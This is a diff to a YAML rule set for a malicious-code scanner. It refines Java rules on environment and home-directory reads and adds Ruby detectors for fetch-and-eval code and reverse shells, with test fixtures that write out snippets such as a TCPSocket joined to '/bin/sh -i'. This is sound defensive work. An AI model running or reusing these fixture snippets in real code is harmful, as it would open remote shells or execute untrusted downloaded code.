@@ -138,7 +138,10 @@ rules:
     match:
       kind: regex
       patterns:
-        - '\bSystem\s*\.\s*getenv\s*\(\s*\)'
+        # The whole environment, not one variable read through it: `System.getenv()["CI"]`,
+        # `.get("BASE_IMAGE")` and `.containsKey("CI")` name the variable they read
+        # (review 98: three Gradle builds blocked as credential theft for it).
+        - '\bSystem\s*\.\s*getenv\s*\(\s*\)(?!\s*(?:\[|\.\s*(?:get|containsKey|getOrDefault)\s*\(\s*["'']))'
         - '\.ssh/id_|\.aws/credentials|\.m2/settings\.xml'
         - '\bKeyStore\s*\.\s*getInstance\b'
     tests:
@@ -146,6 +149,8 @@ rules:
         - "Map<String,String> all = System.getenv();"
       negative:
         - "String port = System.getenv(\"PORT\");"
+        - 'from(System.getenv()["BASE_IMAGE"])'
+        - 'downloadSources.set(!System.getenv().containsKey("CI"))'
 
   - id: CAP.JVM.EGRESS.001
     version: 1.0.0
@@ -441,6 +446,35 @@ rules:
         - "# eval is not used here"
         - "obj = Marshal.load(data)"
 
+  - id: CAP.RB.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is evaluated directly
+    message: >
+      The result of a network read is handed straight to eval or a shell: what runs is whatever the
+      remote host served at that moment.
+    remediation: Verify a downloaded artefact against a known digest before anything runs it.
+    languages: [ruby]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:eval|instance_eval|class_eval|module_eval|system|exec|spawn)(?:\s*\(\s*|[^\S ]* \s*)(?:Kernel\s*\.\s*|URI\s*\.\s*)?open\s*\(\s*[^)\n]{1,200}\)\s*\.\s*read\b'
+        - '\b(?:eval|instance_eval|class_eval|module_eval|system|exec|spawn)(?:\s*\(\s*|[^\S ]* \s*)Net::HTTP\s*\.\s*get\s*\('
+        - '\b(?:eval|instance_eval|class_eval|module_eval)(?:\s*\(\s*|[^\S ]* \s*)(?:HTTParty|RestClient|Faraday)\s*\.\s*get\s*\([^)\n]{1,200}\)\s*(?:\.\s*body\b)?'
+    tests:
+      positive:
+        - "eval(open('https://example.invalid/x').read)"
+        - "eval(URI.open(url).read)"
+        - "eval(Net::HTTP.get(URI(url)))"
+        - "eval HTTParty.get(url).body"
+      negative:
+        - "page = URI.open(url).read"
+        - "File.open(path).read"
+        - "eval(File.read(path))"
+
   - id: CAP.RB.DESERIALIZE.001
     version: 1.0.0
     category: policy
@@ -532,11 +566,50 @@ rules:
         - '\bopen-uri\b|\bURI\s*\.\s*(?:open|parse)\s*\('
         - '\bHTTParty\b|\bFaraday\b|\bRestClient\b'
         - '\bTCPSocket\s*\.\s*new\s*\('
+        - '\bResolv(?:::DNS)?\s*(?:\.\s*(?:new|open|getaddress|getaddresses|getresources?)\b)'
+        - '(?:\bKernel\s*\.\s*|(?<![.\w]))open\s*\(\s*["''](?:https?|ftp)://'
     tests:
       positive:
         - "Net::HTTP.post(uri, body)"
+        - "data = open('https://example.invalid/x').read"
       negative:
         - "# HTTP calls go through the client module"
+
+  - id: CAP.RB.SHELL_STDIO_JOINED.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: egress
+    title: Joins a shell's input and output to a socket (Ruby)
+    message: >
+      This file opens a socket and then gives a command shell that socket as its standard input
+      and output -- by reopening STDIN and STDOUT onto it before an exec, or by spawning the shell
+      with its streams redirected to it. A shell whose input and output are a socket is a remote
+      prompt, whether the address is a literal, a variable or a setting.
+    remediation: >
+      No action for this signal alone. It is how a reverse shell is written in Ruby.
+    provenance:
+      kind: incident
+      reference: >
+        RubyGems zzhelloworld_socktest (OSV MAL-2026-18126): TCPSocket.new, STDIN/STDOUT/STDERR
+        reopened onto it, exec("/bin/sh", "-i"); the scanner reported nothing (CDI, 2026-10-23).
+    languages: [ruby]
+    baseline_hits: 0
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:TCPSocket|SSLSocket|Socket)\s{0,4}(?:\.\s{0,4}(?:new|open|tcp)|::new)\b[\s\S]{0,1500}?(?:\$std(?:in|out|err)|\bSTD(?:IN|OUT|ERR))\s{0,4}\.\s{0,4}reopen\s{0,4}\([\s\S]{0,800}?\b(?:exec|spawn|system)\s{0,4}[( ]\s{0,4}["''](?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh\b'
+        - '\b(?:TCPSocket|SSLSocket|Socket)\s{0,4}(?:\.\s{0,4}(?:new|open|tcp)|::new)\b[\s\S]{0,1500}?\b(?:exec|spawn|Process\s{0,4}\.\s{0,4}spawn)\s{0,4}[( ]\s{0,4}["''](?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh["''][^\n]{0,200}?(?:\[\s{0,4}:in\b|\b(?:in|out|err):\s{0,4}[A-Za-z_@$]|:(?:in|out|err)\s{0,4}=>)'
+    tests:
+      positive:
+        - "s = TCPSocket.new(host, port)\nSTDIN.reopen(s)\nSTDOUT.reopen(s)\nexec(\"/bin/sh\", \"-i\")"
+        - "c = TCPSocket.open(h, p)\nspawn(\"/bin/bash\", \"-i\", [:in, :out, :err] => c)"
+        - "sock = Socket.tcp(addr, 4444)\nProcess.spawn(\"/bin/sh\", in: sock, out: sock, err: sock)"
+      negative:
+        - "s = TCPSocket.new(host, port)\ns.write(payload)\nsystem(\"ls\")"
+        - "STDOUT.reopen(File.open(log, \"a\"))\nexec(\"/bin/sh\", \"-c\", cmd)"
+        - "spawn(\"/bin/sh\", \"-c\", cmd, out: log)"
 
   - id: CAP.RB.PERSIST.001
     version: 1.0.0
@@ -865,15 +938,23 @@ rules:
       kind: regex
       patterns:
         - '\bInetAddress\s*\.\s*getLocalHost\s*\('
-        - '\bSystem\s*\.\s*getProperty\s*\(\s*["\'](?:user\.name|user\.home)["\']'
+        - '\bSystem\s*\.\s*getProperty\s*\(\s*["\']user\.name["\']'
+        # The home directory read for itself. Followed at once by a path under it -- a Gradle
+        # script's `"${System.getProperty("user.home")}/.android/debug.keystore"`, `+ "/.m2"` --
+        # it locates a local file and reports nothing (review 98 G6: two Android builds).
+        - '\bSystem\s*\.\s*getProperty\s*\(\s*["\']user\.home["\']\s*\)(?!\s*\}?\s*[/\\]|\s*\+\s*["\'][/\\])'
         - '\bgetHostName\s*\(\s*\)'
     tests:
       positive:
         - "String h = InetAddress.getLocalHost().getHostName();"
         - "System.getProperty(\"user.name\")"
+        - "body.put(\"home\", System.getProperty(\"user.home\"));"
+        - "String q = \"?h=\" + System.getProperty(\"user.home\");"
       negative:
         - "System.getProperty(\"java.version\")"
         - "new File(path)"
+        - "storeFile = file(\"${System.getProperty(\"user.home\")}/.android/debug.keystore\")"
+        - "File(System.getProperty(\"user.home\") + \"/.m2/settings.xml\")"
 
   - id: CAP.RB.RECON.001
     version: 1.0.0
@@ -895,6 +976,7 @@ rules:
         - '\bSocket\s*\.\s*gethostname\b'
         - '\bEtc\s*\.\s*(?:getlogin|getpwuid)\b'
         - '\bDir\s*\.\s*home\b'
+        - '\bFile\s*\.\s*expand_path\s*\(\s*["'']~["'']\s*\)'
     tests:
       positive:
         - "host = Socket.gethostname"
